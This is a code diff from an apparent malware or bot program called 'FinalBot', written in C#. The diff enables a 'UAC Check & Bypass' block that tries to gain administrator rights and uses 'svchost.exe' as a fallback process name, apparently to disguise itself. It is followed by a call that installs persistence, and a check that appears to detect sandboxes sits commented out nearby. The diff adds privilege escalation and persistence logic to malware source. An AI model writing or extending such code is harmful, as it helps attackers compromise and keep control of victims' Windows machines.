@@ -57,13 +57,20 @@ namespace FinalBot
             // if (SafetyManager.VerifySystemContext()) return;
 
             // 3. UAC Check & Bypass
-            /*
             if (!ElevationService.IsAdmin())
             {
-                ElevationService.RequestElevation(Process.GetCurrentProcess().MainModule?.FileName ?? "FinalBot.exe");
-                return; 
+                DebugLog("Not admin. Attempting UAC bypass...");
+                string selfPath = Process.GetCurrentProcess().MainModule?.FileName ?? "svchost.exe";
+                if (ElevationService.RequestElevation(selfPath))
+                {
+                    DebugLog("UAC bypass request sent. Exiting non-admin process.");
+                    return; 
+                }
             }
-            */
+            else
+            {
+                DebugLog("Running with ADMIN privileges.");
+            }
 
             // 4. Persistence
             Persistence.Install();
